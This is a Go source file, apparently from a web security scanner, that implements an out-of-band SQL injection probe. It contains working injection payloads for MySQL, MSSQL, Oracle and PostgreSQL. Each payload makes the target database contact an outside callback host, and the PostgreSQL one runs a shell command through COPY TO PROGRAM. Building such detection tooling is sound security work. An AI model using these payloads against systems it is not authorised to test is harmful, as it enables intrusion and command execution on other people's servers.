package sqli_out_of_band

import (
	"fmt"

	"github.com/pkg/errors"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
)

// injectionType is recorded on every planted OAST payload. It contains "sql" so a
// resulting callback is classified as blind SQL injection by oast.classifySQLi
// (rather than the generic SSRF branch).
const injectionType = "sql-injection (out-of-band)"

// oobSQLShapeFns build the per-DBMS out-of-band SQL fragments. Each takes the
// unique OAST host and the quote used to break out of the surrounding string
// literal (empty in a numeric context). A fragment makes the database resolve or
// fetch the host, so a callback is unforgeable proof the injected SQL executed.
// The DBMS the fragment targets is noted; sending all shapes covers the backend
// blind (only the matching engine calls back).
var oobSQLShapeFns = []func(host, q string) string{
	// MySQL/MariaDB (Windows): LOAD_FILE of a UNC path triggers an SMB/DNS lookup.
	func(h, q string) string { return q + ` AND LOAD_FILE('\\\\` + h + `\\vig')-- -` },
	// MSSQL: xp_dirtree walks a UNC path (SMB/DNS), stacked after the value.
	func(h, q string) string { return q + `; EXEC master..xp_dirtree '\\\\` + h + `\\vig'-- -` },
	// Oracle: UTL_INADDR resolves the host over DNS.
	func(h, q string) string {
		return q + ` AND 1=(SELECT UTL_INADDR.get_host_address('` + h + `') FROM dual)-- -`
	},
	// Oracle: UTL_HTTP makes an outbound HTTP request.
	func(h, q string) string { return q + ` AND 1=UTL_HTTP.REQUEST('http://` + h + `/')-- -` },
	// PostgreSQL: COPY ... TO PROGRAM runs a shell command (needs superuser).
	func(h, q string) string { return q + `; COPY (SELECT '') TO PROGRAM 'nslookup ` + h + `'-- -` },
}

// Module implements the out-of-band SQL injection active scanner.
type Module struct {
	modkit.BaseActiveModule
	rhm dedup.Lazy[dedup.RequestHashManager]
}

// New creates a new out-of-band SQL injection module.
func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeInsertionPoint,
			modkit.AllParamTypes,
		),
		rhm: dedup.LazyDefaultRHM("sqli_out_of_band"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// VulnClass lets the executor dedup against the in-band SQLi modules: if another
// module already confirmed SQLi at this location, the OOB probe is redundant.
func (m *Module) VulnClass() string { return "sqli" }

// ScanPerInsertionPoint injects the per-DBMS out-of-band payloads into a
// parameter. Findings arrive asynchronously via the OAST polling callback; there
// is no in-band signal to inspect, so a non-SQL/non-vulnerable endpoint simply
// never calls back (the technology gate is the callback itself).
func (m *Module) ScanPerInsertionPoint(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	oast := scanCtx.OASTProv()
	if oast == nil || !oast.Enabled() {
		return nil, nil
	}

	urlx, err := ctx.URL()
	if err != nil {
		return nil, nil
	}
	if !infra.IsValidForInjectionVulns(urlx, ctx) {
		return nil, nil
	}

	rhm := m.rhm.Get(scanCtx.DedupMgr())
	if rhm != nil {
		if !rhm.ShouldCheckInsertionPoint(urlx, ctx.Request(), ip.Name(), ip.BaseValue(), fmt.Sprintf("%d", ip.Type())) {
			return nil, nil
		}
	}

	base := ip.BaseValue()
	// Choose the breakout quote from the value's context: a numeric value sits
	// unquoted in the query, a string value inside single quotes we must close.
	quote := "'"
	if infra.IsNumericValue(base) {
		quote = ""
	}

	requestHash := ctx.Request().ID()
	for _, shape := range oobSQLShapeFns {
		host := oast.GenerateURL(urlx.String(), ip.Name(), injectionType, ModuleID, requestHash)
		if host == "" {
			return nil, nil
		}
		payload := base + shape(host, quote)
		// Record the exact injected value so a callback finding reconstructs the
		// planting request faithfully.
		oast.RecordPayload(host, payload)

		raw := ip.BuildRequest([]byte(payload))
		if abort := m.fire(ctx, httpClient, raw); abort {
			return nil, nil
		}
	}

	return nil, nil
}

// fire sends a fuzzed raw request and discards the response. It returns abort=true
// only when the host has become unresponsive, signalling the caller to stop.
func (m *Module) fire(ctx *httpmsg.HttpRequestResponse, httpClient *http.Requester, raw []byte) (abort bool) {
	req := httpmsg.NewRequestResponseRaw(raw, ctx.Service())
	resp, _, err := httpClient.Execute(req, http.Options{})
	if err != nil {
		return errors.Is(err, hosterrors.ErrUnresponsiveHost)
	}
	resp.Close()
	return false
}
